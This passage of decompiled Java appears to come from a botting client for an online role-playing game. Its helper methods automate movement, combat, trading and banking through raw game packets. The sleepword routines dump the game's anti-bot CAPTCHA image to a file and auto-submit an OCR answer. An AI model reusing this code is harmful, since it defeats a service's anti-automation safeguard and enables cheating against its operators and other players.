            if(mobx[k] + bigx == i && moby[k] + bigy == j)
                return k;

        return -1;
    }

    public int playerarray(int i, int j)
    {
        for(int k = 0; k < playerCount; k++)
            if(player[k].x == i - bigx && player[k].y == j - bigy)
                return k;

        return -1;
    }

    public int npcarray(int i, int j)
    {
        for(int k = 0; k < npcCount; k++)
            if(npc[k].x == i - bigx && npc[k].y == j - bigy)
                return k;

        return -1;
    }

    public void SetFightMode(int i)
    {
        fightmode = i;
        super.packets.id(74);
        super.packets.var(fightmode);
        super.packets.send();
    }

    public boolean EmptyTile(int i, int j)
    {
        return playerarray(i, j) == -1;
    }

    public int FindInv(int i)
    {
        for(int j = 0; j < InvCount; j++)
            if(inv[j] == i)
                return j;

        return -1;
    }

    public void AtObject(int i, int j)
    {
        if(mobarray(i, j) != -1)
        {
            enn(i - bigx, j - bigy, mobid[mobarray(i, j)], mobtype[mobarray(i, j)]);
            super.packets.id(38);
            super.packets.cmd(i);
            super.packets.cmd(j);
            super.packets.send();
        }
    }

    public void AtObject2(int i, int j)
    {
        if(mobarray(i, j) != -1)
        {
            enn(i - bigx, j - bigy, mobid[mobarray(i, j)], mobtype[mobarray(i, j)]);
            super.packets.id(172);
            super.packets.cmd(i);
            super.packets.cmd(j);
            super.packets.send();
        }
    }

    public void Walk(int i, int j)
    {
        fdl(smallx, smally, i - bigx, j - bigy, false);
        if(ehd == -24)
            ehd = 24;
    }

    public int GetX()
    {
        return smallx + bigx;
    }

    public int GetY()
    {
        return smally + bigy;
    }

    public int Rand(int i, int j)
    {
        Random random = new Random(System.currentTimeMillis());
        return random.nextInt((j + 1) - i) + i;
    }

    public void Say2(String s)
    {
        int i = cen.cfe(s);
        acn(cen.cfa, i);
        s = cen.cfd(cen.cfa, 0, i);
        s = ffn.fhe(s);
    }

 public void Say(String s)
    {
        int i = cen.cfe(s);
        acn(cen.cfa, i);
        s = cen.cfd(cen.cfa, 0, i);
        s = ffn.fhe(s);
        myplayer.lastSaidTime = 150;
        myplayer.lastSaidMessage = s;
        DisplayMessage(myplayer.name + ": " + s, 2);
    }

    public int playerfromid(int i)
    {
        for(int j = 0; j < playerCount; j++)
            if(player[j].id == i)
                return j;

        return -1;
    }

    public void SleepWord()
    {
        super.packets.id(142);
        super.packets.hfk("-null-");
        if(!dee)
        {
            super.packets.var(0);
            dee = true;
        }
        super.packets.send();
        super.fln = "";
        super.fma = "";
        ejk = "Fucking ocr - Please wait...";
        dc = System.currentTimeMillis();
    }

    public void MagicPlayer(int i, int j)
    {
        int k = (player[playerfromid(i)].x - 64) / absnpc;
        int l = (player[playerfromid(i)].y - 64) / absnpc;
        fdl(smallx, smally, k, l, true);
        super.packets.id(56);
        super.packets.cmd(i);
        super.packets.cmd(j);
        super.packets.send();
        selectedspell = -1;
    }

    public void UseOnPlayer(int i, int j)
    {
        int k = (player[playerfromid(i)].x - 64) / absnpc;
        int l = (player[playerfromid(i)].y - 64) / absnpc;
        fdl(smallx, smally, k, l, true);
        super.packets.id(11);
        super.packets.cmd(i);
        super.packets.cmd(j);
        super.packets.send();
        selecteditem = -1;
    }

    public void AttackPlayer(int i)
    {
        int j = (player[playerfromid(i)].x - 64) / absnpc;
        int k = (player[playerfromid(i)].y - 64) / absnpc;
        fdl(smallx, smally, j, k, true);
        super.packets.id(124);
        super.packets.cmd(i);
        super.packets.send();
    }

    public void DuelPlayer(int i)
    {
        if(playerfromid(i) != -1)
        {
            super.packets.id(217);
            super.packets.cmd(i);
            super.packets.send();
        }
    }

    public void TradePlayer(int i)
    {
        super.packets.id(62);
        super.packets.cmd(i);
        super.packets.send();
    }

    public void FollowPlayer(int i)
    {
        super.packets.id(91);
        super.packets.cmd(i);
        super.packets.send();
    }

    public int itemfrompos(int i, int j, int k)
    {
        for(int l = 0; l < 1500; l++)
            if(itemx[l] == i - bigx && itemy[l] == j - bigy)
                return l;

        return -1;
    }

    public void MagicItem(int i, int j, int k, int l)
    {
        if(itemfrompos(i, j, k) != -1)
        {
            fbc(smallx, smally, itemx[itemfrompos(i, j, k)], itemy[itemfrompos(i, j, k)], true);
            super.packets.id(18);
            super.packets.cmd(i);
            super.packets.cmd(j);
            super.packets.cmd(k);
            super.packets.cmd(l);
            super.packets.send();
            selectedspell = -1;
        }
    }

    public void UseOnItem(int i, int j, int k, int l)
    {
        if(itemfrompos(i, j, k) != 1)
        {
            fbc(smallx, smally, i - bigx, j - bigy, true);
            super.packets.id(255);
            super.packets.cmd(i);
            super.packets.cmd(j);
            super.packets.cmd(k);
            super.packets.cmd(l);
            super.packets.send();
            selecteditem = -1;
        }
    }

    public void ForceWalk(int i, int j)
    {
        fbc(smallx, smally, i - bigx, j - bigy, true);
        super.packets.id(253);
        super.packets.cmd(i);
        super.packets.cmd(j);
        super.packets.cmd(747);
        super.packets.cmd(0);
        super.packets.send();
    }

    public boolean TakeItem(int i, int j, int k)
    {
        if(itemfrompos(i, j, k) != 1)
        {
            fbc(smallx, smally, i - bigx, j - bigy, true);
            super.packets.id(253);
            super.packets.cmd(i);
            super.packets.cmd(j);
            super.packets.cmd(k);
            super.packets.cmd(0);
            super.packets.send();
            return true;
        } else
        {
            return false;
        }
    }
public int npcfromid(int i)
    {
        for(int j = 0; j < npcCount; j++)
            if(npc[j].id == i)
                return j;

        return -1;
    }

    public int NPCX(int i)
    {
        if(i != -1 && npcfromid(i) != -1)
            return (npc[npcfromid(i)].x - 64) / absnpc + bigx;
        else
            return -1;
    }

    public int NPCY(int i)
    {
        if(i != -1 && npcfromid(i) != -1)
            return (npc[npcfromid(i)].y - 64) / absnpc + bigy;
        else
            return -1;
    }

    public void MagicNPC(int i, int j)
    {
        if(npcfromid(i) != -1)
        {
            int k = (npc[npcfromid(i)].x - 64) / absnpc;
            int l = (npc[npcfromid(i)].y - 64) / absnpc;
            fdl(smallx, smally, k, l, true);
            super.packets.id(10);
            super.packets.cmd(i);
            super.packets.cmd(j);
            super.packets.send();
            selectedspell = -1;
        }
    }

    public void UseOnNPC(int i, int j)
    {
        if(npcfromid(i) != -1)
        {
            int k = (npc[npcfromid(i)].x - 64) / absnpc;
            int l = (npc[npcfromid(i)].y - 64) / absnpc;
            fdl(smallx, smally, k, l, true);
            super.packets.id(143);
            super.packets.cmd(i);
            super.packets.cmd(j);
            super.packets.send();
            selectedspell = -1;
        }
    }

    public void TalkToNPC(int i)
    {
        if(npcfromid(i) != -1)
        {
            int j = (npc[npcfromid(i)].x - 64) / absnpc;
            int k = (npc[npcfromid(i)].y - 64) / absnpc;
            fdl(smallx, smally, j, k, true);
            super.packets.id(159);
            super.packets.cmd(i);
            super.packets.send();
        }
    }

    public void AttackNPC(int i)
    {
        if(npcfromid(i) != -1)
        {
            int j = (npc[npcfromid(i)].x - 64) / absnpc;
            int k = (npc[npcfromid(i)].y - 64) / absnpc;
            fdl(smallx, smally, j, k, true);
            super.packets.id(118);
            super.packets.cmd(i);
            super.packets.send();
        }
    }

    public void ThieveNPC(int i)
    {
        if(npcfromid(i) != -1)
        {
            int j = (npc[npcfromid(i)].x - 64) / absnpc;
            int k = (npc[npcfromid(i)].y - 64) / absnpc;
            fdl(smallx, smally, j, k, true);
            super.packets.id(89);
            super.packets.cmd(i);
            super.packets.send();
        }
    }

    public void MagicDoor(int i, int j, int k, int l)
    {
        fef(i - bigx, j - bigy, k);
        super.packets.id(76);
        super.packets.cmd(i);
        super.packets.cmd(j);
        super.packets.var(k);
        super.packets.cmd(l);
        super.packets.send();
        selectedspell = -1;
    }

    public void UseOnDoor(int i, int j, int k, int l)
    {
        fef(i - bigx, j - bigy, k);
        super.packets.id(71);
        super.packets.cmd(i);
        super.packets.cmd(j);
        super.packets.var(k);
        super.packets.cmd(l);
        super.packets.send();
        selectedspell = -1;
    }

    public void OpenDoor(int i, int j, int k)
    {
        fef(i - bigx, j - bigy, k);
        super.packets.id(100);
        super.packets.cmd(i);
        super.packets.cmd(j);
        super.packets.var(k);
        super.packets.send();
    }

    public void CloseDoor(int i, int j, int k)
    {
        fef(i - bigx, j - bigy, k);
        super.packets.id(121);
        super.packets.cmd(i);
        super.packets.cmd(j);
        super.packets.var(k);
        super.packets.send();
    }

    public int mobfrompos(int i, int j)
    {
        for(int k = 0; k < 1500; k++)
            if(mobx[k] == i - bigx && moby[k] == j - bigy)
                return k;

        return -1;
    }

    public void MagicObject(int i, int j, int k)
    {
        if(mobfrompos(i, j) != -1)
        {
            enn(i - bigx, j - bigy, mobid[mobfrompos(i, j)], mobtype[mobfrompos(i, j)]);
            super.packets.id(237);
            super.packets.cmd(i);
            super.packets.cmd(j);
            super.packets.cmd(k);
            super.packets.send();
            selectedspell = -1;
        }
    }

    public void UseOnObject(int i, int j, int k)
    {
        if(mobfrompos(i, j) != -1)
        {
            enn(i - bigx, j - bigy, mobid[mobfrompos(i, j)], mobtype[mobfrompos(i, j)]);
            super.packets.id(127);
            super.packets.cmd(i);
            super.packets.cmd(j);
            super.packets.cmd(k);
            super.packets.send();
            selectedspell = -1;
        }
    }

    public void Magic(int i)
    {
        super.packets.id(201);
        super.packets.cmd(i);
        super.packets.send();
        selectedspell = -1;
    }

    public void Answer(int i)
    {
        super.packets.id(189);
        super.packets.var(i);
        super.packets.send();
        QuestMenu = false;
    }

    public void MagicInventory(int i, int j)
    {
        super.packets.id(166);
        super.packets.cmd(i);
        super.packets.cmd(j);
        super.packets.send();
        selectedspell = -1;
    }

    public void UseWithInventory(int i, int j)
    {
        super.packets.id(235);
        super.packets.cmd(i);
        super.packets.cmd(j);
        super.packets.send();
        selecteditem = -1;
    }

    public void Remove(int i)
    {
        super.packets.id(40);
        super.packets.cmd(i);
        super.packets.send();
    }

    public void Wield(int i)
    {
        super.packets.id(199);
        super.packets.cmd(i);
        super.packets.send();
    }

    public void Use(int i)
    {
        super.packets.id(24);
        super.packets.cmd(i);
        super.packets.send();
    }

    public void Drop(int i)
    {
        super.packets.id(123);
        super.packets.cmd(i);
        super.packets.send();
        selecteditem = -1;
        selectedmenu = 0;
        DisplayMessage("Dropping " + identify.itemName[inv[i]], 4);
    }

    public void Deposit(int i, int j)
    {
        super.packets.id(190);
        super.packets.cmd(i);
        super.packets.cmd(j);
        super.packets.send();
    }

    public void Withdraw(int i, int j)
    {
        super.packets.id(131);
        super.packets.cmd(i);
        super.packets.cmd(j);
        super.packets.send();
    }

    public void CloseBank()
    {
        super.packets.id(78);
        super.packets.send();
        bank = false;
    }

    public void CloseShop()
    {
        super.packets.id(92);
        super.packets.send();
        shop = false;
    }

    public int FindShop(int i)
    {
        for(int j = 0; j < 40; j++)
            if(ebd[j] == i)
                return j;

        return -1;
    }

    public void Buy(int i)
    {
        if(FindShop(i) != -1)
        {
            int j = ebd[FindShop(i)];
            int k = dei + ebf[FindShop(i)];
            if(k < 10)
                k = 10;
            int l = (k * identify.ahk[j]) / 100;
            super.packets.id(67);
            super.packets.cmd(i);
            super.packets.hfb(l);
            super.packets.send();
        }
    }

    public int FindBank(int i)
    {
        for(int j = 0; j < anInt889; j++)
            if(anIntArray955[j] == i)
                return j;

        return -1;
    }

    public int BankCount(int i)
    {
        if(FindBank(i) != -1)
            return anIntArray956[FindBank(i)];
        else
            return 0;
    }

    public int ShopCount(int i)
    {
        if(FindShop(i) != -1)
            return ebe[FindShop(i)];
        else
            return 0;
    }

    public void PrayerOn(int i)
    {
        super.packets.id(202);
        super.packets.var(i);
        super.packets.send();
        dia[i] = true;
        faj("prayeron");
    }

    public void PrayerOff(int i)
    {
        super.packets.id(162);
        super.packets.var(i);
        super.packets.send();
        dia[i] = false;
        faj("prayeroff");
    }

    public boolean Prayer(int i)
    {
        return dia[i];
    }

    public void Sell(int i)
    {
        if(FindShop(i) != -1)
        {
            int j = ebd[FindShop(i)];
            int k = deh + ebf[FindShop(i)];
            if(k < 10)
                k = 10;
            int l = (k * identify.ahk[j]) / 100;
            super.packets.id(177);
            super.packets.cmd(i);
            super.packets.hfb(l);
            super.packets.send();
        }
    }

    public int PlayerByName(String s)
    {
        for(int i = 0; i < playerCount; i++)
            if(player[i].name.equalsIgnoreCase(s))
                return player[i].id;

        return -1;
    }

    public boolean InCombat()
    {
        return myplayer.hah == 8 || myplayer.hah == 9;
    }

    public boolean PlayerInCombat(int i)
    {
        return player[playerfromid(i)].hah == 8 || player[playerfromid(i)].hah == 9;
    }

    public int PlayerHP(int i)
    {
        return player[playerfromid(i)].hbg;
    }

    public int PlayerX(int i)
    {
        if(playerfromid(i) != -1)
            return (player[playerfromid(i)].x - 64) / absnpc + bigx;
        else
            return -1;
    }

    public int PlayerY(int i)
    {
        if(playerfromid(i) != -1)
            return (player[playerfromid(i)].y - 64) / absnpc + bigy;
        else
            return -1;
    }

    public int PlayerDestX(int i)
    {
        if(playerfromid(i) != -1)
        {
            int j = player[playerfromid(i)].hah;
            if(j == 0)
                return PlayerX(i);
            if(j == 1)
                return PlayerX(i) + 1;
            if(j == 2)
                return PlayerX(i) + 1;
            if(j == 3)
                return PlayerX(i) + 1;
            if(j == 4)
                return PlayerX(i);
            if(j == 5)
                return PlayerX(i) - 1;
            if(j == 6)
                return PlayerX(i) - 1;
            if(j == 7)
                return PlayerX(i) - 1;
        }
        return -1;
    }

    public int PlayerDestY(int i)
    {
        if(playerfromid(i) != -1)
        {
            int j = player[playerfromid(i)].hah;
            if(j == 0)
                return PlayerY(i) - 1;
            if(j == 1)
                return PlayerY(i) - 1;
            if(j == 2)
                return PlayerY(i);
            if(j == 3)
                return PlayerY(i) + 1;
            if(j == 4)
                return PlayerY(i) + 1;
            if(j == 5)
                return PlayerY(i) + 1;
            if(j == 6)
                return PlayerY(i);
            if(j == 7)
                return PlayerY(i) - 1;
        }
        return -1;
    }

    public int GetCurrentStat(int i)
    {
        return curstat[i];
    }

    public int GetStat(int i)
    {
        return stat[i];
    }

    public int GetNearestItem(int ai[], boolean flag)
    {
        boolean flag1 = false;
        boolean flag2 = false;
        boolean flag3 = false;
        double d = 100D;
        int i1 = -1;
label0:
        for(int j1 = 0; j1 < itemCount; j1++)
        {
            if(j1 == 0)
            {
                int k1 = 0;
                do
                {
                    if(k1 >= ai.length)
                        continue label0;
                    if(itemtype[j1] == ai[k1])
                    {
                        int i = Math.abs(Math.abs(smallx) - Math.abs(itemx[j1]));
                        int k = Math.abs(Math.abs(smally) - Math.abs(itemy[j1]));
                        if(i == 0 || k == 0)
                            d = i + k;
                        else
                            d = (double)(i + k) * 0.5D;
                        if(flag)
                            i1 = itemx[j1] + bigx;
                        else
                            i1 = itemy[j1] + bigy;
                    }
                    k1++;
                } while(true);
            }
            for(int l1 = 0; l1 < ai.length; l1++)
            {
                if(itemtype[j1] != ai[l1])
                    continue;
                int j = Math.abs(Math.abs(smallx) - Math.abs(itemx[j1]));
                int l = Math.abs(Math.abs(smally) - Math.abs(itemy[j1]));
                if(j == 0 || l == 0)
                {
                    if((double)(j + l) >= d)
                        continue;
                    d = j + l;
                    if(flag)
                        i1 = itemx[j1] + bigx;
                    else
                        i1 = itemy[j1] + bigy;
                    continue;
                }
                if((double)(j + l) * 0.5D >= d)
                    continue;
                d = (double)(j + l) * 0.5D;
                if(flag)
                    i1 = itemx[j1] + bigx;
                else
                    i1 = itemy[j1] + bigy;
            }

        }

        return i1;
    }

    public int GetNearestItemType(int ai[])
    {
        boolean flag = false;
        boolean flag1 = false;
        boolean flag2 = false;
        double d = 100D;
        int i1 = -1;
label0:
        for(int j1 = 0; j1 < itemCount; j1++)
        {
            if(j1 == 0)
            {
                int k1 = 0;
                do
                {
                    if(k1 >= ai.length)
                        continue label0;
                    if(itemtype[j1] == ai[k1])
                    {
                        int i = Math.abs(Math.abs(smallx) - Math.abs(itemx[j1]));
                        int k = Math.abs(Math.abs(smally) - Math.abs(itemy[j1]));
                        if(i == 0 || k == 0)
                            d = i + k;
                        else
                            d = (double)(i + k) * 0.5D;
                        i1 = ai[k1];
                    }
                    k1++;
                } while(true);
            }
            for(int l1 = 0; l1 < ai.length; l1++)
            {
                if(itemtype[j1] != ai[l1])
                    continue;
                int j = Math.abs(Math.abs(smallx) - Math.abs(itemx[j1]));
                int l = Math.abs(Math.abs(smally) - Math.abs(itemy[j1]));
                if(j == 0 || l == 0)
                {
                    if((double)(j + l) < d)
                    {
                        d = j + l;
                        i1 = ai[l1];
                    }
                    continue;
                }
                if((double)(j + l) * 0.5D < d)
                {
                    d = (double)(j + l) * 0.5D;
                    i1 = ai[l1];
                }
            }

        }

        return i1;
    }

    public int GetNearestNPC(int ai[], int i, int j, int k, int l)
    {
        boolean flag = false;
        boolean flag1 = false;
        boolean flag2 = false;
        double d = 100D;
        int i2 = -1;
label0:
        for(int j2 = 0; j2 < npcCount; j2++)
        {
            if(j2 == 0)
            {
                int k2 = 0;
                do
                {
                    if(k2 >= ai.length)
                        continue label0;
                    if(npc[j2].type == ai[k2] && npc[j2].hah < 8)
                    {
                        int i3 = (npc[j2].x - 64) / absnpc;
                        int k3 = (npc[j2].y - 64) / absnpc;
                        if(i3 + bigx >= i + bigx && i3 <= k && k3 + bigy >= j && k3 + bigy <= l)
                        {
                            int i1 = Math.abs(Math.abs(smallx) - Math.abs((npc[j2].x - 64) / absnpc));
                            int k1 = Math.abs(Math.abs(smally) - Math.abs((npc[j2].y - 64) / absnpc));
                            if(i1 == 0 || k1 == 0)
                                d = i1 + k1;
                            else
                                d = (double)(i1 + k1) * 0.5D;
                            i2 = npc[j2].id;
                        }
                    }
                    k2++;
                } while(true);
            }
            for(int l2 = 0; l2 < ai.length; l2++)
            {
                if(npc[j2].type != ai[l2] || npc[j2].hah >= 8)
                    continue;
                int j3 = (npc[j2].x - 64) / absnpc;
                int l3 = (npc[j2].y - 64) / absnpc;
                if(j3 + bigx < i + bigx || j3 > k || l3 + bigy < j || l3 + bigy > l)
                    continue;
                int j1 = Math.abs(Math.abs(smallx) - Math.abs((npc[j2].x - 64) / absnpc));
                int l1 = Math.abs(Math.abs(smally) - Math.abs((npc[j2].y - 64) / absnpc));
                if(j1 == 0 || l1 == 0)
                {
                    if((double)(j1 + l1) < d)
                    {
                        d = j1 + l1;
                        i2 = npc[j2].id;
                    }
                    continue;
                }
                if((double)(j1 + l1) * 0.5D < d)
                {
                    d = (double)(j1 + l1) * 0.5D;
                    i2 = npc[j2].id;
                }
            }

        }

        return i2;
    }

    public int DoorAt(int i, int j, int k)
    {
        for(int l = 0; l < doorcount; l++)
            if(doorx[l] == i - bigx && doory[l] == j - bigy && doordir[l] == k)
                return doortype[l];

        return -1;
    }

    public int PlayerAt(int i, int j)
    {
        for(int k = 0; k < playerCount; k++)
            if((player[k].x - 64) / absnpc + bigx == i && (player[k].y - 64) / absnpc + bigx == j)
                return player[k].id;

        return -1;
    }

    public int ObjectAt(int i, int j)
    {
        for(int k = 0; k < mobCount; k++)
            if(mobx[k] == i - bigx && moby[k] == j - bigy)
                return mobtype[k];

        return -1;
    }

    public int GetNearestObject(int ai[], boolean flag, int i, int j, int k, int l)
    {
        boolean flag1 = false;
        boolean flag2 = false;
        boolean flag3 = false;
        double d = 100D;
        int i2 = -1;
label0:
        for(int j2 = 0; j2 < mobCount; j2++)
        {
            if(j2 == 0)
            {
                int k2 = 0;
                do
                {
                    if(k2 >= ai.length)
                        continue label0;
                    if(mobtype[j2] == ai[k2] && mobx[j2] + bigx >= i && mobx[j2] + bigx <= k && moby[j2] + bigy >= j && moby[j2] + bigy <= l)
                    {
                        int i1 = Math.abs(Math.abs(smallx) - Math.abs(mobx[j2]));
                        int k1 = Math.abs(Math.abs(smally) - Math.abs(moby[j2]));
                        if(i1 == 0 || k1 == 0)
                            d = i1 + k1;
                        else
                            d = (double)(i1 + k1) * 0.5D;
                        if(flag)
                            i2 = mobx[j2] + bigx;
                        else
                            i2 = moby[j2] + bigy;
                    }
                    k2++;
                } while(true);
            }
            for(int l2 = 0; l2 < ai.length; l2++)
            {
                if(mobtype[j2] != ai[l2] || mobx[j2] + bigx < i || mobx[j2] + bigx > k || moby[j2] + bigy < j || moby[j2] + bigy > l)
                    continue;
                int j1 = Math.abs(Math.abs(smallx) - Math.abs(mobx[j2]));
                int l1 = Math.abs(Math.abs(smally) - Math.abs(moby[j2]));
                if(j1 == 0 || l1 == 0)
                {
                    if((double)(j1 + l1) >= d)
                        continue;
                    d = j1 + l1;
                    if(flag)
                        i2 = mobx[j2] + bigx;
                    else
                        i2 = moby[j2] + bigy;
                    continue;
                }
                if((double)(j1 + l1) * 0.5D >= d)
                    continue;
                d = (double)(j1 + l1) * 0.5D;
                if(flag)
                    i2 = mobx[j2] + bigx;
                else
                    i2 = moby[j2] + bigy;
            }

        }

        return i2;
    }

	public void savepic(byte abyte0[])
    {
        int i1 = 1;
        byte byte0 = 0;
        int j1;
        for(j1 = 0; j1 < 255;)
        {
            int k1 = abyte0[i1++] & 0xff;
            for(int i2 = 0; i2 < k1; i2++)
                Zb[j1++] = byte0;

            byte0 = (byte)(255 - byte0);
        }

        for(int l1 = 1; l1 < 40; l1++)
        {
            for(int j2 = 0; j2 < 255;)
            {
                int k2 = abyte0[i1++] & 0xff;
                for(int l2 = 0; l2 < k2; l2++)
                {
                    Zb[j1] = Zb[j1 - 255];
                    j1++;
                    j2++;
                }

                if(j2 < 255)
                {
                    Zb[j1] = (byte)(255 - Zb[j1 - 255]);
                    j1++;
                    j2++;
                }
            }

        }
        File file = new File("slword.txt");
        if(file.exists())
            ec = file.lastModified();
        else
            ec = -1L;
        cc = false;
        dc = System.currentTimeMillis();

        System.out.println("Writing HC.BMP");
        a("HC.BMP", Zb);
	}


	public void sleepword()
	{
		if ((tfatigue * 100) / 750 == 0)
		{
			try
			{
				File file = new File("slword.txt");
				if(file.exists() && ec != file.lastModified())
				{
					FileInputStream fileinputstream = new FileInputStream("slword.txt");
					int i1 = fileinputstream.available();
					if(i1 > 9)
						i1 = 9;
					ac = "";
					for(int j1 = 0; j1 < i1; j1++)
					{
						char c1 = (char)fileinputstream.read();
						if(c1 == '\n' || c1 == '\r')
						break;
						ac += c1;
					}

					fileinputstream.close();
					cc = true;
					System.out.println("Sleepword: " + ac);
				
					ec = file.lastModified();

					super.packets.id(142);
					super.packets.hfk(ac);
					super.packets.send();
					super.fln = "";
					super.fma = "";
					ejk = "Fucking ocr Please wait...";
					dc = System.currentTimeMillis();
				}
			}
			catch (IOException e)
			{
				e.toString();
				System.out.println("IOException");	
			}
		}
	}

	long ec = -1L;
	boolean cc = true;
	long dc;
	String ac;


    public void a(String s1, byte abyte0[])
    {
        try
        {
            FileOutputStream fileoutputstream = new FileOutputStream(s1);
            fileoutputstream.write(66);
            fileoutputstream.write(77);
            int i1 = 1342;
            fileoutputstream.write(i1 & 0xff);
            fileoutputstream.write(i1 >> 8 & 0xff);
            fileoutputstream.write(0);
            fileoutputstream.write(0);
            fileoutputstream.write(0);
            fileoutputstream.write(0);
            fileoutputstream.write(0);
            fileoutputstream.write(0);
            i1 = 62;
            fileoutputstream.write(i1 & 0xff);
            fileoutputstream.write(i1 >> 8 & 0xff);
            fileoutputstream.write(0);
            fileoutputstream.write(0);
            i1 = 40;
            fileoutputstream.write(i1 & 0xff);
            fileoutputstream.write(i1 >> 8 & 0xff);
            fileoutputstream.write(0);
            fileoutputstream.write(0);
            i1 = 256;
            fileoutputstream.write(i1 & 0xff);
            fileoutputstream.write(i1 >> 8 & 0xff);
            fileoutputstream.write(0);
            fileoutputstream.write(0);
            i1 = 40;
            fileoutputstream.write(i1 & 0xff);
            fileoutputstream.write(i1 >> 8 & 0xff);
            fileoutputstream.write(0);
            fileoutputstream.write(0);
            i1 = 1;
            fileoutputstream.write(i1 & 0xff);
            fileoutputstream.write(i1 >> 8 & 0xff);
            i1 = 1;
            fileoutputstream.write(i1 & 0xff);
            fileoutputstream.write(i1 >> 8 & 0xff);
            i1 = 0;
            fileoutputstream.write(i1 & 0xff);
            fileoutputstream.write(i1 >> 8 & 0xff);
            fileoutputstream.write(0);
            fileoutputstream.write(0);
            i1 = 0;
            fileoutputstream.write(i1 & 0xff);
            fileoutputstream.write(i1 >> 8 & 0xff);
            fileoutputstream.write(0);
            fileoutputstream.write(0);
            i1 = 0;
            fileoutputstream.write(i1 & 0xff);
            fileoutputstream.write(i1 >> 8 & 0xff);
            fileoutputstream.write(0);
            fileoutputstream.write(0);
            i1 = 0;
            fileoutputstream.write(i1 & 0xff);
            fileoutputstream.write(i1 >> 8 & 0xff);
            fileoutputstream.write(0);
            fileoutputstream.write(0);
            i1 = 0;
            fileoutputstream.write(i1 & 0xff);
            fileoutputstream.write(i1 >> 8 & 0xff);
            fileoutputstream.write(0);
            fileoutputstream.write(0);
            i1 = 0;
            fileoutputstream.write(i1 & 0xff);
            fileoutputstream.write(i1 >> 8 & 0xff);
            fileoutputstream.write(0);
            fileoutputstream.write(0);
            fileoutputstream.write(0);
            fileoutputstream.write(0);
            fileoutputstream.write(0);
            fileoutputstream.write(0);
            fileoutputstream.write(255); //255
            fileoutputstream.write(255); //255
            fileoutputstream.write(255); //255
            fileoutputstream.write(0);
            int j1 = 9945;
            for(int k1 = 0; k1 < 40; k1++)
            {
                for(int l1 = 0; l1 < 32; l1++)
                {
                    byte byte0 = 0;
                    for(int i2 = 0; i2 < 8; i2++)
                    {
                        byte0 = (byte)(2 * byte0);
                        if(l1 != 31 || i2 != 7)
                        {
                            if(abyte0[j1] != 0)
                                byte0++;
                            j1++;
                        }
                    }

                    fileoutputstream.write(byte0);
                }

                j1 -= 510;
            }

            fileoutputstream.close();
        }
        catch(IOException ioexception)
        {
			ioexception.toString();
            System.out.println("EXCEPTION");
        }
    }




	public int Distance(int x, int y)
	{
		int farX = Math.abs(Math.abs(smallx + bigx) - Math.abs(x));
		int farY = Math.abs(Math.abs(smally + bigy) - Math.abs(y));
		return farX + farY;
	}


	public boolean CanReach(int x, int y)
	{
		return CanReach2(smallx,smally,x-bigx,y-bigy,x-bigx,y-bigy,false);
	}

    public final boolean CanReach2(int i, int j, int k, int l, int i1, int j1, boolean flag)
    {
        int i2 = identify.anInt144;
        int k1 = efh.method411(i, j, k, l, i1, j1, anIntArray962, anIntArray963, flag);
        if(k1 == -1)
			return false;
        return true;
    }

	public int TradeStatus()
	{
		if(tradeSecond)
            return 1;
        if(tradeFirst)
            return 2;
		return 0;
	}
	
	public boolean Accepted()
	{
		return aBoolean944;
	}

	public int GetUnbusyBanker()
	{		
		int count = 0;
		double far = 0;
		int returnValue = -1;
		for(int y2 = 0; y2 < npcCount; y2++) 
		{
			if(npc[y2].type == 95)
				if (npc[y2].lastSaidMessage.indexOf("Certainly") > -1)
					if (npc[y2].lastSaidTime > far)
					{
						far = npc[y2].lastSaidTime;
						returnValue = npc[y2].id;
					}
		}
		return returnValue;
	}
	public int GetUnbusyBanker2()
	{		
		int count = 0;
		double far = 150;
		int returnValue = -1;
		for(int y2 = 0; y2 < npcCount; y2++) 
		{
			if(npc[y2].type == 95)
				if (npc[y2].lastSaidMessage.indexOf("Certainly") > -1)
					if (npc[y2].lastSaidTime < far)
					{
						far = npc[y2].lastSaidTime;
						returnValue = npc[y2].id;
					}
		}
		return returnValue;
	}


	public boolean ItemAt(int x, int y, int type)
	{
		for (int z = 0; z < itemCount; z++)
			if (itemx[z] == x - bigx && itemy[z] == y - bigy && itemtype[z] == type)
				return true;
		return false;
	}

	public String GetAnswer(int pos)
	{
		return aStringArray913[pos];
	}
	public int GetDistance(int x1, int y1, int x2, int y2)
	{
		int farX = Math.abs(Math.abs(x1) - Math.abs(x2));
		int farY = Math.abs(Math.abs(y1) - Math.abs(y2));
		return farX + farY;
	}
	public String GetItemCommand(int type)
	{
		return identify.itemCommand[type];
	}
	public String GetItemDesc(int type)
	{
		return identify.itemDesc[type];
	}
	public String GetItemName(int type)
	{
		return identify.itemName[type];
	}
	public int GetPrayerLevel(int prayer)
	{
		return identify.prayerLevel[prayer];
	}
	public int GetPrayerDrain(int prayer)
	{
		return identify.prayerDrain[prayer];
	}
	public String GetNPCCommand(int type)
	{
		return identify.npcCommand[type];	
	}
	public String GetNPCDesc(int type)
	{
		return identify.npcDesc[type];
	}
	public int GetNPCType(int id)
	{
		for (int i = 0; i < npcCount; i++)
			if (npc[i].id == id)
				return npc[i].type;
		return -1;
	}
	public int GetNPCLevel(int type)
	{
		return (identify.npcAttack[type] + identify.npcDefence[type] + identify.npcStrength[type] + identify.npcHits[type]) / 4;
	}
	public int GetNPCMaxHP(int type)
	{
		return identify.npcHits[type];
	}
	public String GetNPCName(int type)
	{
		return identify.npcName[type];	
	}
	public int GetAnswerCount()
	{
		return answerCount;
	}
	public String GetObjectCommand1(int type)
	{
		return identify.mobCommand1[type];
	}
	public String GetObjectCommand2(int type)
	{
		return identify.mobCommand2[type];
	}
	public String GetObjectDesc(int type)
	{
		return identify.mobDesc[type];
	}
	public String GetObjectName(int type)
	{
		return identify.mobName[type];
	}
	public boolean Wearable(int type)
	{
		if (identify.isWearable[type] != 0)
			return true;
		return false;
	}
	public boolean IsWorn(int slot)
	{
		if (isWorn[slot] == 1)
			return true;
		return false;
	}
	public boolean IsNPCAttackable(int type)
	{
		if (identify.attackable[type] > 0)
			return true;
		return false;
	}
	public boolean NPCExists(int id)
	{
		for (int i = 0; i < npcCount; i++)
			if (npc[i].id == id)
				return true;
		return false;
	}
	public boolean NPCInCombat(int id)
	{
		if (npc[npcfromid(id)].hah == 8 || npc[npcfromid(id)].hah == 9)
			return true;
		else
			return false;
	}
	public boolean Loading()
	{
        if(enb != 0)
        {
            efh.gjj = false;
            return true;
        }
		if (ehc != 1)
			return true;
		int i = smallx;
		int j = smally;
        dih = false;
        i += dha;
        j += dhb;
        if(dhd == egl && i > dic && i < die && j > did && j < dif)
        {
            efh.gjj = true;
            return true;
        }
		return false;
	}
	public void WaitForLoad()
	{
		while (Loading())
		{
